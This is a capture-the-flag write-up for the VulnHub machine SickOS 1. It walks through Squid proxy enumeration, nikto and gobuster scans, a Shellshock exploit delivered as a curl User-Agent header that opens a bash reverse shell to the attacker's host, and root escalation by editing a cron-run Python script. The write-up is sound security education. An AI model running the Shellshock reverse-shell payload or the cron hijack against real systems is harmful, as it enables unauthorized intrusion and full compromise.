---
title: "SickOS 1"
date: 2024-07-22
draft: false
summary: "Writeup for SickOS 1 CTF challenge on VulnHub."
tags: ["linux", "cron", "shellshock"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/sickos1/cover.webp"
  caption: "SickOS 1 VulnHub Challenge"
  alt: "SickOS 1 cover"
platform: "VulnHub"
---

SickOS is a boot2root challenge with the objective of compromising the machine and gaining root privilege on it.
<!--more-->
To download **sickos 1**, click on the link given below :-
- https://www.vulnhub.com/entry/sickos-11,132/

## Recon

I performed a network scan to identify the targe IP.

```bash
nmap -sn 192.168.1.0/24                                        
```

I then performed an **nmap** aggressive scan to identify open ports, services running on them and additional service information.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN sick1.nmap
```

![](https://cdn.ziomsec.com/sickos1/1.webp)

## Initial Foothold

I accessed the web server on the open port but got an error message. This error page revealed the version of squid server.

![](https://cdn.ziomsec.com/sickos1/2.webp)

I googled the **squid** version and found this **hacktricks** article where it referenced a scanner to find open ports:
- https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid

![](https://cdn.ziomsec.com/sickos1/3.webp)

Hence, I downloaded the **python** script and ran it to find discover additional ports.
- https://github.com/aancw/spose

```shell
git clone https://github.com/aancw/spose.git
cd spose
python spose.py --proxy http://TARGET:SQUID_PORT --target TARGET
```

![](https://cdn.ziomsec.com/sickos1/4.webp)

I then used the **squid** server as proxy and accessed port 80.

```shell
curl --proxy http://TARGET:3128 http://TARGET:80
```

![](https://cdn.ziomsec.com/sickos1/5.webp)

I then set the proxy on my browser and accessed it through the browser.

![](https://cdn.ziomsec.com/sickos1/6.webp)

![](https://cdn.ziomsec.com/sickos1/7.webp)

Since the landing page did not reveal anything, I used **gobuster** to find hidden files.

```shell
gobuster dir --proxy http://TARGET:3128 -u http://TARGET/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

![](https://cdn.ziomsec.com/sickos1/8.webp)

The *robots.txt* file could contain interesting endpoints, so I accessed it:

```shell
curl --proxy http://TARGET:3128 http://TARGET/robots.txt
```

![](https://cdn.ziomsec.com/sickos1/9.webp)

I revealed an endpoint leading to *wolf CMS*.

![](https://cdn.ziomsec.com/sickos1/10.webp)

The page did not reveal anything interesting, so I ran a **nikto** scan on the target.

```shell
nikto -useproxy http://TARGET:3128 -h http://TARGET
```

![](https://cdn.ziomsec.com/sickos1/11.webp)

The scan identified a **Shellshock** vulnerability on the server.

> [!INFO] About Shellshock
> **Shellshock** (also known as Bashdoor) is a security bug in the Bash (Bourne Again Shell) command-line shell, widely used in Unix-based systems such as Linux and macOS. Discovered in September 2014, Shellshock allows attackers to execute arbitrary commands on vulnerable systems.

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

I referred to the above article and got a reverse shell by exploiting the vulnerability.

```shell
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/KALI/PORT 0>&1" --proxy http://TARGET:3128 http://TARGET/cgi-bin/status
```

![](https://cdn.ziomsec.com/sickos1/12.webp)

## Privilege Escalation

To perform further enumeration, I downloaded the **linux smart enumeration** script locally and transferred it to the target.

![](https://cdn.ziomsec.com/sickos1/13.webp)

![](https://cdn.ziomsec.com/sickos1/14.webp)

It discovered a python file that was being run by root.

![](https://cdn.ziomsec.com/sickos1/15.webp)

I read the file and found out that it just had few print statements.

![](https://cdn.ziomsec.com/sickos1/16.webp)

Since I had write access over it, I added a code block that would get me a reverse shell.

![](https://cdn.ziomsec.com/sickos1/17.webp)

After the file got executed by root, I got a reverse shell on my listener.

![](https://cdn.ziomsec.com/sickos1/18.webp)

Finally I captured the flag from */root* directory.

![](https://cdn.ziomsec.com/sickos1/19.webp)

## Closure

Here's a summary of how I obtained the root flag:
- I used the **squid** proxy to connect to the target web server.
- Upon accessing the target, I performed a **nikto** scan and identified a **shellshock** vulnerability in one of the paths.
- I exploited this vulnerability to execute a **bash** script and obtain a reverse shell.
- I then ran the **linux smart enumeration** script to identify misconfigurations for privilege escalation.
- I modified the Python script that was executed via **crons** with **root** privileges.
- With the reverse shell as the **root** user, I captured the flag from the */root* directory.

That's it from my side, until next time :)
Happy Hacking! 🎉

---